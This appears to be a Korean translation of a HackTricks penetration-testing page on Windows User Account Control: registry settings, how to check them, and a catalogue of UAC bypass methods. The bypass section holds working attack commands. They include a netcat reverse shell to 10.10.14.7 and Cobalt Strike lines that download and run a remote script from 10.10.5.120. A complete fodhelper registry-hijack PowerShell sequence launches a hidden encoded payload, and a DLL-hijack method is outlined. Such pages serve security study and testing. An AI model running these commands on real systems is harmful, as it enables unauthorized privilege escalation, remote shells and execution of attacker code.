# UAC - 사용자 계정 컨트롤

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 는 **권한 상승 작업에 대한 동의 프롬프트**를 제공하는 기능입니다. 응용 프로그램은 서로 다른 `integrity` 레벨을 가지며, **높은 레벨**의 프로그램은 **시스템을 손상시킬 수 있는** 작업을 수행할 수 있습니다. UAC가 활성화되면, 애플리케이션과 작업은 관리자가 명시적으로 해당 애플리케이션/작업에 관리자 수준 접근을 허용하지 않는 한 항상 **비관리자 계정의 보안 컨텍스트로 실행됩니다**. 이는 관리자를 의도치 않은 변경으로부터 보호하는 편의 기능이지만 보안 경계로 간주되지는 않습니다.

integrity 레벨에 대한 자세한 정보:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면, 관리자 사용자는 2개의 토큰을 부여받습니다: 일반 작업을 수행하는 표준 사용자 토큰과 관리자 권한을 가진 토큰입니다.

이 [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 는 UAC의 동작 방식(로그온 프로세스, 사용자 경험, UAC 아키텍처 포함)을 매우 상세히 설명합니다. 관리자는 로컬 수준에서(secpol.msc 사용) 보안 정책으로 조직에 맞게 UAC 동작을 구성할 수 있으며, Active Directory 도메인 환경에서는 Group Policy Objects(GPO)를 통해 구성·배포할 수 있습니다. 다양한 설정은 [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 자세히 설명되어 있습니다. UAC에 대해 설정할 수 있는 Group Policy 설정은 10개가 있으며, 다음 표는 추가 세부 정보를 제공합니다:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 비활성화                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 비활성화                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 비-Windows 바이너리에 대해 동의 요청                          |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 보안 데스크톱에서 자격 증명 요청                             |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 활성화(홈의 기본값) / 비활성화(엔터프라이즈의 기본값)         |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 비활성화                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 활성화                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 활성화                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 활성화                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 활성화                                                      |

### UAC Bypass Theory

일부 프로그램은 사용자가 **관리자 그룹**에 속해 있으면 **자동으로 autoelevated** 될 수 있습니다. 이러한 바이너리들은 그들의 _**Manifests**_ 안에 값이 _**True**_인 _**autoElevate**_ 옵션을 포함하고 있어야 하며, 또한 바이너리는 **Microsoft에 의해 서명**되어 있어야 합니다.

많은 auto-elevate 프로세스는 **COM objects 또는 RPC servers를 통해 기능을 제공**하며, 이는 medium integrity(일반 사용자 수준 권한)로 실행되는 프로세스에서 호출할 수 있습니다. COM(Component Object Model)과 RPC(Remote Procedure Call)는 Windows 프로그램이 서로 다른 프로세스 간에 통신하고 기능을 실행하는 방법입니다. 예를 들어, **`IFileOperation COM object`**는 파일 작업(복사, 삭제, 이동)을 처리하도록 설계되었으며 프롬프트 없이 자동으로 권한을 상승시킬 수 있습니다.

프로세스가 **System32 directory**에서 실행되었는지 확인하는 등의 검사가 수행될 수 있는데, 이는 예를 들어 **injecting into explorer.exe** 또는 System32에 위치한 다른 실행 파일에 주입함으로써 우회할 수 있습니다.

이러한 검사를 우회하는 또 다른 방법은 **PEB를 수정**하는 것입니다. Windows의 모든 프로세스는 실행 파일 경로 등 프로세스에 관한 중요한 데이터를 포함하는 Process Environment Block(PEB)을 가지고 있습니다. PEB를 수정함으로써 공격자는 자신의 악성 프로세스의 위치를 위조(spoof)하여 신뢰되는 디렉터리(예: system32)에서 실행되는 것처럼 보이게 할 수 있습니다. 이 스푸핑된 정보는 COM 객체를 속여 사용자에게 프롬프트를 표시하지 않고 권한을 자동으로 상승시키게 합니다.

그 결과 UAC를 **bypass**(medium 무결성 수준에서 high로 상승)하기 위해 일부 공격자는 이러한 종류의 바이너리를 이용해 **execute arbitrary code**를 수행합니다. 이는 코드가 **High level integrity process**에서 실행되기 때문입니다.

바이너리의 _**Manifest**_는 Sysinternals의 도구 _**sigcheck.exe**_로 확인할 수 있습니다. (`sigcheck.exe -m <file>`) 또한 프로세스의 **integrity level**은 Sysinternals의 _Process Explorer_ 또는 _Process Monitor_로 확인할 수 있습니다.

### Check UAC

UAC가 활성화되어 있는지 확인하려면 다음을 실행하세요:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
만약 **`1`**이면 UAC는 **활성화됨**, **`0`**이거나 존재하지 않으면 UAC는 **비활성화됨**.

그런 다음, **어떤 레벨**이 구성되어 있는지 확인하세요:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **사용 안 함**)
- If **`1`** the admin is **사용자 이름과 비밀번호를 요구받음** to execute the binary with high rights (on 보안 데스크톱)
- If **`2`** (**항상 알림**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on 보안 데스크톱)
- If **`3`** like `1` but not necessary on 보안 데스크톱
- If **`4`** like `2` but not necessary on 보안 데스크톱
- if **`5`**(**기본값**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **존재하지 않음**, **아무에게도 UAC 없음**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1`**, **아무에게도 UAC 없음**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`**, RID 500 (Built-in Administrator)에는 UAC 없음
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`**, 모든 사용자에게 UAC 적용

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC 우회

> [!TIP]
> 피해자에 그래픽으로 접근할 수 있다면, UAC 프롬프트가 뜰 때 단순히 "예"를 클릭하면 되므로 UAC 우회는 매우 간단하다는 점을 참고하세요

UAC 우회는 다음 상황에서 필요합니다: **UAC가 활성화되어 있고, 프로세스가 medium integrity context에서 실행 중이며, 사용자가 administrators 그룹에 속해 있는 경우**.

특히 UAC가 최고 보안 수준(Always)에 설정된 경우에는 다른 모든 수준(Default)에 비해 **UAC를 우회하기가 훨씬 더 어렵다**는 점을 언급하는 것이 중요합니다.

### UAC disabled

UAC가 이미 비활성화되어 있는 경우 (`ConsentPromptBehaviorAdmin`이 **`0`**) 다음과 같이 **reverse shell을 admin privileges로 실행할 수 있습니다** (high integrity level) 다음과 같은 방법을 사용하여:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

만약 Administrators 그룹에 속한 사용자로 쉘이 있다면, 로컬에서 SMB를 통해 **mount the C$** 공유를 새 디스크로 마운트할 수 있고, 그러면 파일 시스템 내부의 모든 항목에 **access to everything inside the file system** (심지어 Administrator home folder까지) 접근할 수 있습니다.

> [!WARNING]
> **이 방법은 더 이상 작동하지 않는 것 같습니다**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike 기술은 UAC가 최대 보안 수준으로 설정되어 있지 않은 경우에만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**와 **Metasploit**에는 **UAC**를 **bypass**하기 위한 여러 모듈도 있다.

### KRBUACBypass

문서와 도구: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)는 여러 UAC bypass exploits의 **모음집**이다. 참고로 **compile UACME using visual studio or msbuild** 해야 한다. 컴파일하면 여러 실행 파일(예: `Source\Akagi\outout\x64\Debug\Akagi.exe`)이 생성되며, 어떤 파일이 필요한지 **알아야 한다.**\
일부 bypass는 다른 프로그램을 호출하여 사용자에게 알림을 보낼 수 있으므로 **주의해야 한다.**

UACME에는 각 technique가 동작을 시작한 **build version**이 기재되어 있다. 자신의 버전에 영향을 주는 technique를 검색할 수 있다:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
또한, [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 페이지를 사용하면 빌드 버전에서 Windows 릴리스 `1607`을 확인할 수 있습니다.

### UAC Bypass – fodhelper.exe (Registry hijack)

신뢰된 바이너리 `fodhelper.exe`는 최신 Windows에서 auto-elevated 됩니다. 실행될 때, 아래의 per-user registry path를 조회하며 `DelegateExecute` verb를 검증하지 않습니다. 그 위치에 명령을 심으면 Medium Integrity 프로세스(사용자가 Administrators에 있는 경우)가 UAC prompt 없이 High Integrity 프로세스를 생성할 수 있습니다.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell 단계 (set your payload, then trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- 현재 사용자가 Administrators 멤버이고 UAC 레벨이 기본/관대(default/lenient)일 때 작동합니다 (Always Notify with extra restrictions가 아닐 경우).
- 64-bit Windows에서 32-bit 프로세스에서 64-bit PowerShell을 시작하려면 `sysnative` 경로를 사용하세요.
- Payload는 PowerShell, cmd 또는 EXE 경로 등 어떤 명령이든 될 수 있습니다. 은밀성을 위해 프롬프트 UI를 유발하는 것은 피하세요.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_가 작동해야 합니다)

### UAC Bypass with GUI

GUI에 접근할 수 있다면, UAC prompt가 뜰 때 단순히 승인하면 되므로 실제로 bypass가 필요하지 않습니다. 따라서 GUI 접근을 얻으면 UAC를 우회할 수 있습니다.

또한, 다른 사용자가 사용 중이던 GUI 세션(예: RDP)을 확보하면, **관리자 권한으로 실행되는 일부 도구들**이 있어 거기에서 예를 들어 **cmd**를 **관리자 권한으로** 직접 **실행**할 수 있고 이 경우 다시 UAC로 프롬프트되지 않습니다. 예: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). 이것은 **좀 더 은밀할 수 있습니다.**

### Noisy brute-force UAC bypass

소음(노이즈)을 신경쓰지 않는다면 [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 같은 것을 **실행하여** 사용자가 수락할 때까지 권한 상승을 요청하게 할 수 있습니다.

### Your own bypass - Basic UAC bypass methodology

UACME를 보면 대부분의 UAC 우회는 **Dll Hijacking** 취약점을 악용한다는 것을 알 수 있습니다 (주로 악성 dll을 _C:\Windows\System32_에 씁니다). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate**하는 바이너리를 찾으세요 (실행 시 높은 무결성 레벨에서 동작하는지 확인).
2. procmon을 사용해 **"NAME NOT FOUND"** 이벤트를 찾아 **DLL Hijacking**에 취약한 위치를 확인하세요.
3. 쓰기 권한이 없는 일부 **protected paths**(예: C:\Windows\System32)에 DLL을 **write**해야 할 수 있습니다. 이를 우회하기 위해 다음을 사용할 수 있습니다:
   1. **wusa.exe**: Windows 7, 8 및 8.1. 이 도구는 높은 무결성 레벨에서 실행되므로 CAB 파일의 내용을 보호된 경로에 추출할 수 있게 해줍니다.
   2. **IFileOperation**: Windows 10.
4. 보호된 경로에 DLL을 복사하고 취약하고 autoelevated된 바이너리를 실행하도록 하는 **script**를 준비하세요.

### Another UAC bypass technique

autoElevated binary가 레지스트리에서 실행할 바이너리나 명령의 **name/path**를 **read**하려고 하는지 관찰하는 기법입니다 (해당 바이너리가 이 정보를 **HKCU**에서 찾는다면 더 흥미롭습니다).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
